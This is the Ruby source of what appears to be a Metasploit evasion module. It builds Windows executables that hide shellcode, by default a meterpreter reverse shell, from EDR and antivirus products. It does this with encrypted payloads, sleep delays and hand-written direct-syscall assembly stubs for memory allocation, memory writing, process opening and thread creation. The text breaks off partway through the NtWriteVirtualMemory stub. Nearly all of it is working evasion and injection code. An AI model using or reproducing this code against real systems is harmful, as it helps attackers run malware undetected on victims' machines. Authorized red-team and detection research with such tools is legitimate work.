require 'metasploit/framework/compiler/mingw'
class MetasploitModule < Msf::Evasion
  INCLUDE_DIR = File.join(Msf::Config.data_directory, 'headers', 'windows', 'rc4.h')
  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Direct windows syscall evasion technique',
        'Description' => %q{
          This module allows you to generate a Windows EXE that evades Host-based security products
          such as EDR/AVs. It uses direct windows syscalls to achieve stealthiness, and avoid EDR hooking.

          please try to use payloads that use a more secure transfer channel such as HTTPS or RC4
          in order to avoid payload's network traffic getting caught by network defense mechanisms.
          NOTE: for better evasion ratio, use high SLEEP values
        },
        'Author' => [ 'Yaz (kensh1ro)' ],
        'License' => MSF_LICENSE,
        'Platform' => 'windows',
        'Arch' => ARCH_X64,
        'Dependencies' => [ Metasploit::Framework::Compiler::Mingw::X64 ],
        'DefaultOptions' => {
          'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'
        },
        'Targets' => [['Microsoft Windows (x64)', {}]]
      )
      )
    register_options(
      [
        OptEnum.new('CIPHER', [ true, 'Shellcode encryption type', 'xor', ['xor', 'rc4']]),
        OptInt.new('SLEEP', [false, 'Sleep time before executing shellcode', 7000]),
        OptBool.new('JUNK', [false, 'Add random info to the final executable', true])
      ]
    )

    register_advanced_options(
      [
        OptEnum.new('OptLevel', [ false, 'The optimization level to compile with', 'Os', [ 'Og', 'Os', 'O0', 'O1', 'O2', 'O3' ] ]),
      ]
    )
  end

  def nt_alloc
    %^
        __asm__("NtAllocateVirtualMemory: \\n\\
            mov rax, gs:[0x60]                                  \\n\\
        NtAllocateVirtualMemory_Check_X_X_XXXX:                \\n\\
            cmp dword ptr [rax+0x118], 6 \\n\\
            je  NtAllocateVirtualMemory_Check_6_X_XXXX \\n\\
            cmp dword ptr [rax+0x118], 10 \\n\\
            je  NtAllocateVirtualMemory_Check_10_0_XXXX \\n\\
            jmp NtAllocateVirtualMemory_SystemCall_Unknown \\n\\
        NtAllocateVirtualMemory_Check_6_X_XXXX:                \\n\\
            cmp dword ptr [rax+0x11c], 1 \\n\\
            je  NtAllocateVirtualMemory_Check_6_1_XXXX \\n\\
            cmp dword ptr [rax+0x11c], 2 \\n\\
            je  NtAllocateVirtualMemory_SystemCall_6_2_XXXX \\n\\
            cmp dword ptr [rax+0x11c], 3 \\n\\
            je  NtAllocateVirtualMemory_SystemCall_6_3_XXXX \\n\\
            jmp NtAllocateVirtualMemory_SystemCall_Unknown \\n\\
        NtAllocateVirtualMemory_Check_6_1_XXXX:                \\n\\
            cmp word ptr [rax+0x120], 7600 \\n\\
            je  NtAllocateVirtualMemory_SystemCall_6_1_7600 \\n\\
            cmp word ptr [rax+0x120], 7601 \\n\\
            je  NtAllocateVirtualMemory_SystemCall_6_1_7601 \\n\\
            jmp NtAllocateVirtualMemory_SystemCall_Unknown \\n\\
        NtAllocateVirtualMemory_Check_10_0_XXXX:               \\n\\
            cmp word ptr [rax+0x120], 10240 \\n\\
            je  NtAllocateVirtualMemory_SystemCall_10_0_10240 \\n\\
            cmp word ptr [rax+0x120], 10586 \\n\\
            je  NtAllocateVirtualMemory_SystemCall_10_0_10586 \\n\\
            cmp word ptr [rax+0x120], 14393 \\n\\
            je  NtAllocateVirtualMemory_SystemCall_10_0_14393 \\n\\
            cmp word ptr [rax+0x120], 15063 \\n\\
            je  NtAllocateVirtualMemory_SystemCall_10_0_15063 \\n\\
            cmp word ptr [rax+0x120], 16299 \\n\\
            je  NtAllocateVirtualMemory_SystemCall_10_0_16299 \\n\\
            cmp word ptr [rax+0x120], 17134 \\n\\
            je  NtAllocateVirtualMemory_SystemCall_10_0_17134 \\n\\
            cmp word ptr [rax+0x120], 17763 \\n\\
            je  NtAllocateVirtualMemory_SystemCall_10_0_17763 \\n\\
            cmp word ptr [rax+0x120], 18362 \\n\\
            je  NtAllocateVirtualMemory_SystemCall_10_0_18362 \\n\\
            cmp word ptr [rax+0x120], 18363 \\n\\
            je  NtAllocateVirtualMemory_SystemCall_10_0_18363 \\n\\
            cmp word ptr [rax+0x120], 19041 \\n\\
            je  NtAllocateVirtualMemory_SystemCall_10_0_19041 \\n\\
            cmp word ptr [rax+0x120], 19042 \\n\\
            je  NtAllocateVirtualMemory_SystemCall_10_0_19042 \\n\\
            jmp NtAllocateVirtualMemory_SystemCall_Unknown \\n\\
        NtAllocateVirtualMemory_SystemCall_6_1_7600:           \\n\\
            mov eax, 0x0015 \\n\\
            jmp NtAllocateVirtualMemory_Epilogue \\n\\
        NtAllocateVirtualMemory_SystemCall_6_1_7601:           \\n\\
            mov eax, 0x0015 \\n\\
            jmp NtAllocateVirtualMemory_Epilogue \\n\\
        NtAllocateVirtualMemory_SystemCall_6_2_XXXX:           \\n\\
            mov eax, 0x0016 \\n\\
            jmp NtAllocateVirtualMemory_Epilogue \\n\\
        NtAllocateVirtualMemory_SystemCall_6_3_XXXX:           \\n\\
            mov eax, 0x0017 \\n\\
            jmp NtAllocateVirtualMemory_Epilogue \\n\\
        NtAllocateVirtualMemory_SystemCall_10_0_10240:         \\n\\
            mov eax, 0x0018 \\n\\
            jmp NtAllocateVirtualMemory_Epilogue \\n\\
        NtAllocateVirtualMemory_SystemCall_10_0_10586:         \\n\\
            mov eax, 0x0018 \\n\\
            jmp NtAllocateVirtualMemory_Epilogue \\n\\
        NtAllocateVirtualMemory_SystemCall_10_0_14393:         \\n\\
            mov eax, 0x0018 \\n\\
            jmp NtAllocateVirtualMemory_Epilogue \\n\\
        NtAllocateVirtualMemory_SystemCall_10_0_15063:         \\n\\
            mov eax, 0x0018 \\n\\
            jmp NtAllocateVirtualMemory_Epilogue \\n\\
        NtAllocateVirtualMemory_SystemCall_10_0_16299:         \\n\\
            mov eax, 0x0018 \\n\\
            jmp NtAllocateVirtualMemory_Epilogue \\n\\
        NtAllocateVirtualMemory_SystemCall_10_0_17134:         \\n\\
            mov eax, 0x0018 \\n\\
            jmp NtAllocateVirtualMemory_Epilogue \\n\\
        NtAllocateVirtualMemory_SystemCall_10_0_17763:         \\n\\
            mov eax, 0x0018 \\n\\
            jmp NtAllocateVirtualMemory_Epilogue \\n\\
        NtAllocateVirtualMemory_SystemCall_10_0_18362:         \\n\\
            mov eax, 0x0018 \\n\\
            jmp NtAllocateVirtualMemory_Epilogue \\n\\
        NtAllocateVirtualMemory_SystemCall_10_0_18363:         \\n\\
            mov eax, 0x0018 \\n\\
            jmp NtAllocateVirtualMemory_Epilogue \\n\\
        NtAllocateVirtualMemory_SystemCall_10_0_19041:         \\n\\
            mov eax, 0x0018 \\n\\
            jmp NtAllocateVirtualMemory_Epilogue \\n\\
        NtAllocateVirtualMemory_SystemCall_10_0_19042:         \\n\\
            mov eax, 0x0018 \\n\\
            jmp NtAllocateVirtualMemory_Epilogue \\n\\
        NtAllocateVirtualMemory_SystemCall_Unknown:            \\n\\
            ret \\n\\
        NtAllocateVirtualMemory_Epilogue: \\n\\
            mov r10, rcx \\n\\
            syscall \\n\\
            ret \\n\\
    ^.strip
  end

  def nt_close
    %(
        NtClose: \\n\\
            mov rax, gs:[0x60]                  \\n\\
        NtClose_Check_X_X_XXXX:                \\n\\
            cmp dword ptr [rax+0x118], 6 \\n\\
            je  NtClose_Check_6_X_XXXX \\n\\
            cmp dword ptr [rax+0x118], 10 \\n\\
            je  NtClose_Check_10_0_XXXX \\n\\
            jmp NtClose_SystemCall_Unknown \\n\\
        NtClose_Check_6_X_XXXX:                \\n\\
            cmp dword ptr [rax+0x11c], 1 \\n\\
            je  NtClose_Check_6_1_XXXX \\n\\
            cmp dword ptr [rax+0x11c], 2 \\n\\
            je  NtClose_SystemCall_6_2_XXXX \\n\\
            cmp dword ptr [rax+0x11c], 3 \\n\\
            je  NtClose_SystemCall_6_3_XXXX \\n\\
            jmp NtClose_SystemCall_Unknown \\n\\
        NtClose_Check_6_1_XXXX:                \\n\\
            cmp word ptr [rax+0x120], 7600 \\n\\
            je  NtClose_SystemCall_6_1_7600 \\n\\
            cmp word ptr [rax+0x120], 7601 \\n\\
            je  NtClose_SystemCall_6_1_7601 \\n\\
            jmp NtClose_SystemCall_Unknown \\n\\
        NtClose_Check_10_0_XXXX:               \\n\\
            cmp word ptr [rax+0x120], 10240 \\n\\
            je  NtClose_SystemCall_10_0_10240 \\n\\
            cmp word ptr [rax+0x120], 10586 \\n\\
            je  NtClose_SystemCall_10_0_10586 \\n\\
            cmp word ptr [rax+0x120], 14393 \\n\\
            je  NtClose_SystemCall_10_0_14393 \\n\\
            cmp word ptr [rax+0x120], 15063 \\n\\
            je  NtClose_SystemCall_10_0_15063 \\n\\
            cmp word ptr [rax+0x120], 16299 \\n\\
            je  NtClose_SystemCall_10_0_16299 \\n\\
            cmp word ptr [rax+0x120], 17134 \\n\\
            je  NtClose_SystemCall_10_0_17134 \\n\\
            cmp word ptr [rax+0x120], 17763 \\n\\
            je  NtClose_SystemCall_10_0_17763 \\n\\
            cmp word ptr [rax+0x120], 18362 \\n\\
            je  NtClose_SystemCall_10_0_18362 \\n\\
            cmp word ptr [rax+0x120], 18363 \\n\\
            je  NtClose_SystemCall_10_0_18363 \\n\\
            cmp word ptr [rax+0x120], 19041 \\n\\
            je  NtClose_SystemCall_10_0_19041 \\n\\
            cmp word ptr [rax+0x120], 19042 \\n\\
            je  NtClose_SystemCall_10_0_19042 \\n\\
            jmp NtClose_SystemCall_Unknown \\n\\
        NtClose_SystemCall_6_1_7600:           \\n\\
            mov eax, 0x000c \\n\\
            jmp NtClose_Epilogue \\n\\
        NtClose_SystemCall_6_1_7601:           \\n\\
            mov eax, 0x000c \\n\\
            jmp NtClose_Epilogue \\n\\
        NtClose_SystemCall_6_2_XXXX:           \\n\\
            mov eax, 0x000d \\n\\
            jmp NtClose_Epilogue \\n\\
        NtClose_SystemCall_6_3_XXXX:           \\n\\
            mov eax, 0x000e \\n\\
            jmp NtClose_Epilogue \\n\\
        NtClose_SystemCall_10_0_10240:         \\n\\
            mov eax, 0x000f \\n\\
            jmp NtClose_Epilogue \\n\\
        NtClose_SystemCall_10_0_10586:         \\n\\
            mov eax, 0x000f \\n\\
            jmp NtClose_Epilogue \\n\\
        NtClose_SystemCall_10_0_14393:         \\n\\
            mov eax, 0x000f \\n\\
            jmp NtClose_Epilogue \\n\\
        NtClose_SystemCall_10_0_15063:         \\n\\
            mov eax, 0x000f \\n\\
            jmp NtClose_Epilogue \\n\\
        NtClose_SystemCall_10_0_16299:         \\n\\
            mov eax, 0x000f \\n\\
            jmp NtClose_Epilogue \\n\\
        NtClose_SystemCall_10_0_17134:         \\n\\
            mov eax, 0x000f \\n\\
            jmp NtClose_Epilogue \\n\\
        NtClose_SystemCall_10_0_17763:         \\n\\
            mov eax, 0x000f \\n\\
            jmp NtClose_Epilogue \\n\\
        NtClose_SystemCall_10_0_18362:         \\n\\
            mov eax, 0x000f \\n\\
            jmp NtClose_Epilogue \\n\\
        NtClose_SystemCall_10_0_18363:         \\n\\
            mov eax, 0x000f \\n\\
            jmp NtClose_Epilogue \\n\\
        NtClose_SystemCall_10_0_19041:         \\n\\
            mov eax, 0x000f \\n\\
            jmp NtClose_Epilogue \\n\\
        NtClose_SystemCall_10_0_19042:         \\n\\
            mov eax, 0x000f \\n\\
            jmp NtClose_Epilogue \\n\\
        NtClose_SystemCall_Unknown:            \\n\\
            ret \\n\\
        NtClose_Epilogue: \\n\\
            mov r10, rcx \\n\\
            syscall \\n\\
            ret \\n\\
    ).strip
  end

  def nt_create_thread
    %(
        NtCreateThreadEx: \\n\\
            mov rax, gs:[0x60]                           \\n\\
        NtCreateThreadEx_Check_X_X_XXXX:                \\n\\
            cmp dword ptr [rax+0x118], 6 \\n\\
            je  NtCreateThreadEx_Check_6_X_XXXX \\n\\
            cmp dword ptr [rax+0x118], 10 \\n\\
            je  NtCreateThreadEx_Check_10_0_XXXX \\n\\
            jmp NtCreateThreadEx_SystemCall_Unknown \\n\\
        NtCreateThreadEx_Check_6_X_XXXX:                \\n\\
            cmp dword ptr [rax+0x11c], 1 \\n\\
            je  NtCreateThreadEx_Check_6_1_XXXX \\n\\
            cmp dword ptr [rax+0x11c], 2 \\n\\
            je  NtCreateThreadEx_SystemCall_6_2_XXXX \\n\\
            cmp dword ptr [rax+0x11c], 3 \\n\\
            je  NtCreateThreadEx_SystemCall_6_3_XXXX \\n\\
            jmp NtCreateThreadEx_SystemCall_Unknown \\n\\
        NtCreateThreadEx_Check_6_1_XXXX:                \\n\\
            cmp word ptr [rax+0x120], 7600 \\n\\
            je  NtCreateThreadEx_SystemCall_6_1_7600 \\n\\
            cmp word ptr [rax+0x120], 7601 \\n\\
            je  NtCreateThreadEx_SystemCall_6_1_7601 \\n\\
            jmp NtCreateThreadEx_SystemCall_Unknown \\n\\
        NtCreateThreadEx_Check_10_0_XXXX:               \\n\\
            cmp word ptr [rax+0x120], 10240 \\n\\
            je  NtCreateThreadEx_SystemCall_10_0_10240 \\n\\
            cmp word ptr [rax+0x120], 10586 \\n\\
            je  NtCreateThreadEx_SystemCall_10_0_10586 \\n\\
            cmp word ptr [rax+0x120], 14393 \\n\\
            je  NtCreateThreadEx_SystemCall_10_0_14393 \\n\\
            cmp word ptr [rax+0x120], 15063 \\n\\
            je  NtCreateThreadEx_SystemCall_10_0_15063 \\n\\
            cmp word ptr [rax+0x120], 16299 \\n\\
            je  NtCreateThreadEx_SystemCall_10_0_16299 \\n\\
            cmp word ptr [rax+0x120], 17134 \\n\\
            je  NtCreateThreadEx_SystemCall_10_0_17134 \\n\\
            cmp word ptr [rax+0x120], 17763 \\n\\
            je  NtCreateThreadEx_SystemCall_10_0_17763 \\n\\
            cmp word ptr [rax+0x120], 18362 \\n\\
            je  NtCreateThreadEx_SystemCall_10_0_18362 \\n\\
            cmp word ptr [rax+0x120], 18363 \\n\\
            je  NtCreateThreadEx_SystemCall_10_0_18363 \\n\\
            cmp word ptr [rax+0x120], 19041 \\n\\
            je  NtCreateThreadEx_SystemCall_10_0_19041 \\n\\
            cmp word ptr [rax+0x120], 19042 \\n\\
            je  NtCreateThreadEx_SystemCall_10_0_19042 \\n\\
            jmp NtCreateThreadEx_SystemCall_Unknown \\n\\
        NtCreateThreadEx_SystemCall_6_1_7600:           \\n\\
            mov eax, 0x00a5 \\n\\
            jmp NtCreateThreadEx_Epilogue \\n\\
        NtCreateThreadEx_SystemCall_6_1_7601:           \\n\\
            mov eax, 0x00a5 \\n\\
            jmp NtCreateThreadEx_Epilogue \\n\\
        NtCreateThreadEx_SystemCall_6_2_XXXX:           \\n\\
            mov eax, 0x00af \\n\\
            jmp NtCreateThreadEx_Epilogue \\n\\
        NtCreateThreadEx_SystemCall_6_3_XXXX:           \\n\\
            mov eax, 0x00b0 \\n\\
            jmp NtCreateThreadEx_Epilogue \\n\\
        NtCreateThreadEx_SystemCall_10_0_10240:         \\n\\
            mov eax, 0x00b3 \\n\\
            jmp NtCreateThreadEx_Epilogue \\n\\
        NtCreateThreadEx_SystemCall_10_0_10586:         \\n\\
            mov eax, 0x00b4 \\n\\
            jmp NtCreateThreadEx_Epilogue \\n\\
        NtCreateThreadEx_SystemCall_10_0_14393:         \\n\\
            mov eax, 0x00b6 \\n\\
            jmp NtCreateThreadEx_Epilogue \\n\\
        NtCreateThreadEx_SystemCall_10_0_15063:         \\n\\
            mov eax, 0x00b9 \\n\\
            jmp NtCreateThreadEx_Epilogue \\n\\
        NtCreateThreadEx_SystemCall_10_0_16299:         \\n\\
            mov eax, 0x00ba \\n\\
            jmp NtCreateThreadEx_Epilogue \\n\\
        NtCreateThreadEx_SystemCall_10_0_17134:         \\n\\
            mov eax, 0x00bb \\n\\
            jmp NtCreateThreadEx_Epilogue \\n\\
        NtCreateThreadEx_SystemCall_10_0_17763:         \\n\\
            mov eax, 0x00bc \\n\\
            jmp NtCreateThreadEx_Epilogue \\n\\
        NtCreateThreadEx_SystemCall_10_0_18362:         \\n\\
            mov eax, 0x00bd \\n\\
            jmp NtCreateThreadEx_Epilogue \\n\\
        NtCreateThreadEx_SystemCall_10_0_18363:         \\n\\
            mov eax, 0x00bd \\n\\
            jmp NtCreateThreadEx_Epilogue \\n\\
        NtCreateThreadEx_SystemCall_10_0_19041:         \\n\\
            mov eax, 0x00c1 \\n\\
            jmp NtCreateThreadEx_Epilogue \\n\\
        NtCreateThreadEx_SystemCall_10_0_19042:         \\n\\
            mov eax, 0x00c1 \\n\\
            jmp NtCreateThreadEx_Epilogue \\n\\
        NtCreateThreadEx_SystemCall_Unknown:            \\n\\
            ret \\n\\
        NtCreateThreadEx_Epilogue: \\n\\
            mov r10, rcx \\n\\
            syscall \\n\\
            ret \\n\\
    ).strip
  end

  def nt_open_process
    %(
        NtOpenProcess: \\n\\
            mov rax, gs:[0x60]                        \\n\\
        NtOpenProcess_Check_X_X_XXXX:                \\n\\
            cmp dword ptr [rax+0x118], 6 \\n\\
            je  NtOpenProcess_Check_6_X_XXXX \\n\\
            cmp dword ptr [rax+0x118], 10 \\n\\
            je  NtOpenProcess_Check_10_0_XXXX \\n\\
            jmp NtOpenProcess_SystemCall_Unknown \\n\\
        NtOpenProcess_Check_6_X_XXXX:                \\n\\
            cmp dword ptr [rax+0x11c], 1 \\n\\
            je  NtOpenProcess_Check_6_1_XXXX \\n\\
            cmp dword ptr [rax+0x11c], 2 \\n\\
            je  NtOpenProcess_SystemCall_6_2_XXXX \\n\\
            cmp dword ptr [rax+0x11c], 3 \\n\\
            je  NtOpenProcess_SystemCall_6_3_XXXX \\n\\
            jmp NtOpenProcess_SystemCall_Unknown \\n\\
        NtOpenProcess_Check_6_1_XXXX:                \\n\\
            cmp word ptr [rax+0x120], 7600 \\n\\
            je  NtOpenProcess_SystemCall_6_1_7600 \\n\\
            cmp word ptr [rax+0x120], 7601 \\n\\
            je  NtOpenProcess_SystemCall_6_1_7601 \\n\\
            jmp NtOpenProcess_SystemCall_Unknown \\n\\
        NtOpenProcess_Check_10_0_XXXX:               \\n\\
            cmp word ptr [rax+0x120], 10240 \\n\\
            je  NtOpenProcess_SystemCall_10_0_10240 \\n\\
            cmp word ptr [rax+0x120], 10586 \\n\\
            je  NtOpenProcess_SystemCall_10_0_10586 \\n\\
            cmp word ptr [rax+0x120], 14393 \\n\\
            je  NtOpenProcess_SystemCall_10_0_14393 \\n\\
            cmp word ptr [rax+0x120], 15063 \\n\\
            je  NtOpenProcess_SystemCall_10_0_15063 \\n\\
            cmp word ptr [rax+0x120], 16299 \\n\\
            je  NtOpenProcess_SystemCall_10_0_16299 \\n\\
            cmp word ptr [rax+0x120], 17134 \\n\\
            je  NtOpenProcess_SystemCall_10_0_17134 \\n\\
            cmp word ptr [rax+0x120], 17763 \\n\\
            je  NtOpenProcess_SystemCall_10_0_17763 \\n\\
            cmp word ptr [rax+0x120], 18362 \\n\\
            je  NtOpenProcess_SystemCall_10_0_18362 \\n\\
            cmp word ptr [rax+0x120], 18363 \\n\\
            je  NtOpenProcess_SystemCall_10_0_18363 \\n\\
            cmp word ptr [rax+0x120], 19041 \\n\\
            je  NtOpenProcess_SystemCall_10_0_19041 \\n\\
            cmp word ptr [rax+0x120], 19042 \\n\\
            je  NtOpenProcess_SystemCall_10_0_19042 \\n\\
            jmp NtOpenProcess_SystemCall_Unknown \\n\\
        NtOpenProcess_SystemCall_6_1_7600:           \\n\\
            mov eax, 0x0023 \\n\\
            jmp NtOpenProcess_Epilogue \\n\\
        NtOpenProcess_SystemCall_6_1_7601:           \\n\\
            mov eax, 0x0023 \\n\\
            jmp NtOpenProcess_Epilogue \\n\\
        NtOpenProcess_SystemCall_6_2_XXXX:           \\n\\
            mov eax, 0x0024 \\n\\
            jmp NtOpenProcess_Epilogue \\n\\
        NtOpenProcess_SystemCall_6_3_XXXX:           \\n\\
            mov eax, 0x0025 \\n\\
            jmp NtOpenProcess_Epilogue \\n\\
        NtOpenProcess_SystemCall_10_0_10240:         \\n\\
            mov eax, 0x0026 \\n\\
            jmp NtOpenProcess_Epilogue \\n\\
        NtOpenProcess_SystemCall_10_0_10586:         \\n\\
            mov eax, 0x0026 \\n\\
            jmp NtOpenProcess_Epilogue \\n\\
        NtOpenProcess_SystemCall_10_0_14393:         \\n\\
            mov eax, 0x0026 \\n\\
            jmp NtOpenProcess_Epilogue \\n\\
        NtOpenProcess_SystemCall_10_0_15063:         \\n\\
            mov eax, 0x0026 \\n\\
            jmp NtOpenProcess_Epilogue \\n\\
        NtOpenProcess_SystemCall_10_0_16299:         \\n\\
            mov eax, 0x0026 \\n\\
            jmp NtOpenProcess_Epilogue \\n\\
        NtOpenProcess_SystemCall_10_0_17134:         \\n\\
            mov eax, 0x0026 \\n\\
            jmp NtOpenProcess_Epilogue \\n\\
        NtOpenProcess_SystemCall_10_0_17763:         \\n\\
            mov eax, 0x0026 \\n\\
            jmp NtOpenProcess_Epilogue \\n\\
        NtOpenProcess_SystemCall_10_0_18362:         \\n\\
            mov eax, 0x0026 \\n\\
            jmp NtOpenProcess_Epilogue \\n\\
        NtOpenProcess_SystemCall_10_0_18363:         \\n\\
            mov eax, 0x0026 \\n\\
            jmp NtOpenProcess_Epilogue \\n\\
        NtOpenProcess_SystemCall_10_0_19041:         \\n\\
            mov eax, 0x0026 \\n\\
            jmp NtOpenProcess_Epilogue \\n\\
        NtOpenProcess_SystemCall_10_0_19042:         \\n\\
            mov eax, 0x0026 \\n\\
            jmp NtOpenProcess_Epilogue \\n\\
        NtOpenProcess_SystemCall_Unknown:            \\n\\
            ret \\n\\
        NtOpenProcess_Epilogue: \\n\\
            mov r10, rcx \\n\\
            syscall \\n\\
            ret \\n\\
    ).strip
  end

  def nt_wait
    %(
        NtWaitForSingleObject: \\n\\
            mov rax, gs:[0x60]                                \\n\\
        NtWaitForSingleObject_Check_X_X_XXXX:                \\n\\
            cmp dword ptr [rax+0x118], 6 \\n\\
            je  NtWaitForSingleObject_Check_6_X_XXXX \\n\\
            cmp dword ptr [rax+0x118], 10 \\n\\
            je  NtWaitForSingleObject_Check_10_0_XXXX \\n\\
            jmp NtWaitForSingleObject_SystemCall_Unknown \\n\\
        NtWaitForSingleObject_Check_6_X_XXXX:                \\n\\
            cmp dword ptr [rax+0x11c], 1 \\n\\
            je  NtWaitForSingleObject_Check_6_1_XXXX \\n\\
            cmp dword ptr [rax+0x11c], 2 \\n\\
            je  NtWaitForSingleObject_SystemCall_6_2_XXXX \\n\\
            cmp dword ptr [rax+0x11c], 3 \\n\\
            je  NtWaitForSingleObject_SystemCall_6_3_XXXX \\n\\
            jmp NtWaitForSingleObject_SystemCall_Unknown \\n\\
        NtWaitForSingleObject_Check_6_1_XXXX:                \\n\\
            cmp word ptr [rax+0x120], 7600 \\n\\
            je  NtWaitForSingleObject_SystemCall_6_1_7600 \\n\\
            cmp word ptr [rax+0x120], 7601 \\n\\
            je  NtWaitForSingleObject_SystemCall_6_1_7601 \\n\\
            jmp NtWaitForSingleObject_SystemCall_Unknown \\n\\
        NtWaitForSingleObject_Check_10_0_XXXX:               \\n\\
            cmp word ptr [rax+0x120], 10240 \\n\\
            je  NtWaitForSingleObject_SystemCall_10_0_10240 \\n\\
            cmp word ptr [rax+0x120], 10586 \\n\\
            je  NtWaitForSingleObject_SystemCall_10_0_10586 \\n\\
            cmp word ptr [rax+0x120], 14393 \\n\\
            je  NtWaitForSingleObject_SystemCall_10_0_14393 \\n\\
            cmp word ptr [rax+0x120], 15063 \\n\\
            je  NtWaitForSingleObject_SystemCall_10_0_15063 \\n\\
            cmp word ptr [rax+0x120], 16299 \\n\\
            je  NtWaitForSingleObject_SystemCall_10_0_16299 \\n\\
            cmp word ptr [rax+0x120], 17134 \\n\\
            je  NtWaitForSingleObject_SystemCall_10_0_17134 \\n\\
            cmp word ptr [rax+0x120], 17763 \\n\\
            je  NtWaitForSingleObject_SystemCall_10_0_17763 \\n\\
            cmp word ptr [rax+0x120], 18362 \\n\\
            je  NtWaitForSingleObject_SystemCall_10_0_18362 \\n\\
            cmp word ptr [rax+0x120], 18363 \\n\\
            je  NtWaitForSingleObject_SystemCall_10_0_18363 \\n\\
            cmp word ptr [rax+0x120], 19041 \\n\\
            je  NtWaitForSingleObject_SystemCall_10_0_19041 \\n\\
            cmp word ptr [rax+0x120], 19042 \\n\\
            je  NtWaitForSingleObject_SystemCall_10_0_19042 \\n\\
            jmp NtWaitForSingleObject_SystemCall_Unknown \\n\\
        NtWaitForSingleObject_SystemCall_6_1_7600:           \\n\\
            mov eax, 0x0001 \\n\\
            jmp NtWaitForSingleObject_Epilogue \\n\\
        NtWaitForSingleObject_SystemCall_6_1_7601:           \\n\\
            mov eax, 0x0001 \\n\\
            jmp NtWaitForSingleObject_Epilogue \\n\\
        NtWaitForSingleObject_SystemCall_6_2_XXXX:           \\n\\
            mov eax, 0x0002 \\n\\
            jmp NtWaitForSingleObject_Epilogue \\n\\
        NtWaitForSingleObject_SystemCall_6_3_XXXX:           \\n\\
            mov eax, 0x0003 \\n\\
            jmp NtWaitForSingleObject_Epilogue \\n\\
        NtWaitForSingleObject_SystemCall_10_0_10240:         \\n\\
            mov eax, 0x0004 \\n\\
            jmp NtWaitForSingleObject_Epilogue \\n\\
        NtWaitForSingleObject_SystemCall_10_0_10586:         \\n\\
            mov eax, 0x0004 \\n\\
            jmp NtWaitForSingleObject_Epilogue \\n\\
        NtWaitForSingleObject_SystemCall_10_0_14393:         \\n\\
            mov eax, 0x0004 \\n\\
            jmp NtWaitForSingleObject_Epilogue \\n\\
        NtWaitForSingleObject_SystemCall_10_0_15063:         \\n\\
            mov eax, 0x0004 \\n\\
            jmp NtWaitForSingleObject_Epilogue \\n\\
        NtWaitForSingleObject_SystemCall_10_0_16299:         \\n\\
            mov eax, 0x0004 \\n\\
            jmp NtWaitForSingleObject_Epilogue \\n\\
        NtWaitForSingleObject_SystemCall_10_0_17134:         \\n\\
            mov eax, 0x0004 \\n\\
            jmp NtWaitForSingleObject_Epilogue \\n\\
        NtWaitForSingleObject_SystemCall_10_0_17763:         \\n\\
            mov eax, 0x0004 \\n\\
            jmp NtWaitForSingleObject_Epilogue \\n\\
        NtWaitForSingleObject_SystemCall_10_0_18362:         \\n\\
            mov eax, 0x0004 \\n\\
            jmp NtWaitForSingleObject_Epilogue \\n\\
        NtWaitForSingleObject_SystemCall_10_0_18363:         \\n\\
            mov eax, 0x0004 \\n\\
            jmp NtWaitForSingleObject_Epilogue \\n\\
        NtWaitForSingleObject_SystemCall_10_0_19041:         \\n\\
            mov eax, 0x0004 \\n\\
            jmp NtWaitForSingleObject_Epilogue \\n\\
        NtWaitForSingleObject_SystemCall_10_0_19042:         \\n\\
            mov eax, 0x0004 \\n\\
            jmp NtWaitForSingleObject_Epilogue \\n\\
        NtWaitForSingleObject_SystemCall_Unknown:            \\n\\
            ret \\n\\
        NtWaitForSingleObject_Epilogue: \\n\\
            mov r10, rcx \\n\\
            syscall \\n\\
            ret \\n\\
    ).strip
  end

  def nt_write
    %^
        NtWriteVirtualMemory: \\n\\
            mov rax, gs:[0x60]                               \\n\\
        NtWriteVirtualMemory_Check_X_X_XXXX:                \\n\\
            cmp dword ptr [rax+0x118], 6 \\n\\
            je  NtWriteVirtualMemory_Check_6_X_XXXX \\n\\
            cmp dword ptr [rax+0x118], 10 \\n\\
            je  NtWriteVirtualMemory_Check_10_0_XXXX \\n\\
            jmp NtWriteVirtualMemory_SystemCall_Unknown \\n\\
        NtWriteVirtualMemory_Check_6_X_XXXX:                \\n\\
            cmp dword ptr [rax+0x11c], 1 \\n\\
            je  NtWriteVirtualMemory_Check_6_1_XXXX \\n\\
            cmp dword ptr [rax+0x11c], 2 \\n\\
            je  NtWriteVirtualMemory_SystemCall_6_2_XXXX \\n\\
            cmp dword ptr [rax+0x11c], 3 \\n\\
            je  NtWriteVirtualMemory_SystemCall_6_3_XXXX \\n\\
            jmp NtWriteVirtualMemory_SystemCall_Unknown \\n\\
        NtWriteVirtualMemory_Check_6_1_XXXX:                \\n\\
            cmp word ptr [rax+0x120], 7600 \\n\\
            je  NtWriteVirtualMemory_SystemCall_6_1_7600 \\n\\
            cmp word ptr [rax+0x120], 7601 \\n\\
            je  NtWriteVirtualMemory_SystemCall_6_1_7601 \\n\\
            jmp NtWriteVirtualMemory_SystemCall_Unknown \\n\\
        NtWriteVirtualMemory_Check_10_0_XXXX:               \\n\\
            cmp word ptr [rax+0x120], 10240 \\n\\
            je  NtWriteVirtualMemory_SystemCall_10_0_10240 \\n\\
            cmp word ptr [rax+0x120], 10586 \\n\\
            je  NtWriteVirtualMemory_SystemCall_10_0_10586 \\n\\
            cmp word ptr [rax+0x120], 14393 \\n\\
            je  NtWriteVirtualMemory_SystemCall_10_0_14393 \\n\\
            cmp word ptr [rax+0x120], 15063 \\n\\
            je  NtWriteVirtualMemory_SystemCall_10_0_15063 \\n\\
            cmp word ptr [rax+0x120], 16299 \\n\\
            je  NtWriteVirtualMemory_SystemCall_10_0_16299 \\n\\
            cmp word ptr [rax+0x120], 17134 \\n\\
            je  NtWriteVirtualMemory_SystemCall_10_0_17134 \\n\\
            cmp word ptr [rax+0x120], 17763 \\n\\
            je  NtWriteVirtualMemory_SystemCall_10_0_17763 \\n\\
            cmp word ptr [rax+0x120], 18362 \\n\\
            je  NtWriteVirtualMemory_SystemCall_10_0_18362 \\n\\
            cmp word ptr [rax+0x120], 18363 \\n\\
            je  NtWriteVirtualMemory_SystemCall_10_0_18363 \\n\\
            cmp word ptr [rax+0x120], 19041 \\n\\
            je  NtWriteVirtualMemory_SystemCall_10_0_19041 \\n\\
            cmp word ptr [rax+0x120], 19042 \\n\\
            je  NtWriteVirtualMemory_SystemCall_10_0_19042 \\n\\
            jmp NtWriteVirtualMemory_SystemCall_Unknown \\n\\
        NtWriteVirtualMemory_SystemCall_6_1_7600:           \\n\\
